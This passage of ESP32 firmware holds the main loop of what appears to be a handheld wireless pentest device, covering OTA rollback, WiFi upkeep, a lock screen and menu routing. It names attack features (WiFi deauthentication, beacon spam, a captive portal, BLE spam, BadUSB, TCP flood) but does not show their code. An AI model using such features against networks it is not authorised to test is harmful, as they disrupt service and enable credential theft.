    // ── Menu init (no screen change — just variables) ──
    Serial.println("[BOOT] menu_init...");
    menu_init();
    menu_set_page(PG_MENU);
    
    g_page = PG_LOCK;
    lock_idle = millis();
    
    Serial.println("[BOOT] Entering loop → PG_LOCK");
    Serial.println("══════════════════════════════════\n");
}

// ═══════════════ LOOP ═══════════════
void loop() {
    static Page last_page = PG_COUNT;
    static uint32_t last_status = 0;
    static uint32_t last_lock_check = 0;
    static uint32_t last_net_check = 0;
    static bool boot_stable = false;
    static bool update_checked = false;
    
    // ── Boot stability: after 10s of uptime, reset boot loop counter ──
    // This proves the device booted successfully and is not in a loop.
    if (!boot_stable && millis() > 10000) {
        boot_stable = true;
        g_boot_count = 0;
        Serial.println("[BOOT] Boot stable — boot counter reset");
        
        // ── OTA Rollback: mark current firmware as VALID ──
        const esp_partition_t* running = esp_ota_get_running_partition();
        esp_ota_img_states_t ota_state;
        if (esp_ota_get_state_partition(running, &ota_state) == ESP_OK) {
            if (ota_state == ESP_OTA_IMG_PENDING_VERIFY) {
                esp_err_t err = esp_ota_mark_app_valid_cancel_rollback();
                if (err == ESP_OK) {
                    Serial.println("[OTA] Firmware marked VALID — rollback cancelled");
                } else {
                    Serial.printf("[OTA] Failed to mark valid: %s\n", esp_err_to_name(err));
                }
            }
        }
    }
    
    // ── Deferred update check: 5s after boot, if WiFi connected ──
    // Runs initial check, then background_update_check handles periodic re-checks
    if (!update_checked && millis() > 5000 && g_wifi_conn) {
        update_checked = true;
        Serial.println("[BOOT] Deferred update check (background, non-blocking)...");
        g_last_update_check = 0;  // Force immediate first check
        background_update_check();
    }
    
    buzzer_update();

    // Maintain dual WiFi connection (auto-reconnect STA if needed)
    wifi_dual_maintain();

    // Status bar refresh (every 500ms for time + blink)
    if (millis() - last_status > 500) {
        last_status = millis();
        scr_draw_status_bar();
    }
    
    // WiFi auto-reconnect + latency check (every 5s)
    if (millis() - last_net_check > 5000) {
        last_net_check = millis();
        wifi_auto_reconnect();
        measure_latency();
        background_update_check();  // Auto-detect new versions every 5 min
    }
    
    // Lock screen timeout
    if (g_page != PG_LOCK) {
        if (millis() - last_lock_check > 1000) {
            last_lock_check = millis();
            if (buttons_is_pressed(BTN_ID_UP) ||
                buttons_is_pressed(BTN_ID_DOWN) ||
                buttons_is_pressed(BTN_ID_LEFT) ||
                buttons_is_pressed(BTN_ID_RIGHT) ||
                buttons_is_pressed(BTN_ID_A) ||
                buttons_is_pressed(BTN_ID_B)) {
                lock_idle = millis();
            }
            if (g_cfg.lock_timeout > 0 && millis() - lock_idle > g_cfg.lock_timeout) {
                g_page = PG_LOCK;
                lock_need = true;
                lock_idle = millis();
            }
        }
    }
    
    // Page routing
    switch (g_page) {
        case PG_LOCK:
            lock_draw();
            if (buttons_get_event(BTN_ID_UP) == BTN_EVENT_PRESS ||
                buttons_get_event(BTN_ID_DOWN) == BTN_EVENT_PRESS ||
                buttons_get_event(BTN_ID_LEFT) == BTN_EVENT_PRESS ||
                buttons_get_event(BTN_ID_RIGHT) == BTN_EVENT_PRESS ||
                buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS ||
                buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
                buzzer_click();
                g_page = PG_MENU;
                menu_set_page(PG_MENU);
                menu_draw();
                lock_idle = millis();
            }
            break;
        
        case PG_MENU: {
            Page next = menu_update();
            if (next != PG_MENU) {
                g_page = next;
                if (next == PG_LOCK) lock_need = true;
                lock_idle = millis();
            }
            break;
        }
        
        case PG_RECON_WIFI:
            recon_wifi();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_RECON_BLE:
            recon_ble();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_RECON_WARD:
            recon_wardrive();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_DEAUTH:
            attk_deauth();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_BEACON:
            attk_beacon();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_PORTAL:
            attk_portal();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_BLE:
            attk_ble_spam();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_BADUSB:
            attk_badusb();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_DEFENSE:
            attk_defense();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_ATTK_TCPFLOOD:
            attk_tcp_flood();
            if (g_web_restore) { webui_restore_after_attack(); }
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_NET_HOST:
            net_host_scan();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_NET_TCP:
            net_tcp_probe();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_NET_TRAFFIC:
            net_traffic_mon();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_EXPLOIT:
            exploit_log();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_FILES:
            sys_files();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_WEBUI:
            sys_webui();
            // Check if WebUI requested an action before exiting
            if (g_web_cmd_pending) {
                g_page = g_web_cmd;
                g_web_cmd_pending = false;
                lock_idle = millis();
                if (g_web_cmd == PG_RECON_WIFI) {
                    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
                    scr_draw_title("WiFi Connect");
                    tft.setTextColor(C_WHITE, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 20);
                    tft.print("Connecting to:");
                    tft.setCursor(4, CONTENT_Y + 32);
                    tft.setTextColor(C_CYAN, C_BLACK);
                    tft.print(g_sta_ssid);
                    WiFi.mode(WIFI_STA);
                    if (g_sta_pass[0]) {
                        WiFi.begin(g_sta_ssid, g_sta_pass);
                    } else {
                        WiFi.begin(g_sta_ssid);
                    }
                    uint32_t start = millis();
                    while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
                        delay(200);
                    }
                    tft.setTextColor(C_WHITE, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 50);
                    if (WiFi.status() == WL_CONNECTED) {
                        tft.print("Connected!");
                        tft.setCursor(4, CONTENT_Y + 62);
                        tft.print("IP: ");
                        tft.print(WiFi.localIP().toString());
                        g_wifi_conn = true;
                        g_wifi_mode = WM_STA;
                    } else {
                        tft.print("Failed!");
                        WiFi.disconnect(true);
                        g_wifi_conn = false;
                        // Restore AP mode so WebUI can still be used
                        WiFi.mode(WIFI_AP);
                        WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
                        g_wifi_mode = WM_AP;
                        tft.setCursor(4, CONTENT_Y + 62);
                        tft.setTextColor(C_YELLOW, C_BLACK);
                        tft.print("AP restored");
                    }
                    tft.setTextColor(C_RED, C_BLACK);
                    tft.setCursor(4, SCR_H - 22);
                    tft.print("B:BACK");
                    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
                    g_page = PG_MENU;
                }
            } else {
                g_page = PG_MENU;
            }
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_TERM:
            sys_term();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_TIME:
            sys_time();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_BRIGHT:
            sys_brightness();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_BUZZER:
            sys_buzzer();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_UPDATE:
            sys_update();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_APPCENTER:
            sys_appcenter();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_SYS_REBOOT:
            sys_reboot();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        case PG_WEATHER:
            weather_forecast();
            g_page = PG_MENU;
            menu_set_page(PG_MENU);
            menu_draw();
            lock_idle = millis();
            break;
        
        default:
            break;
    }
    
    delay(5);
}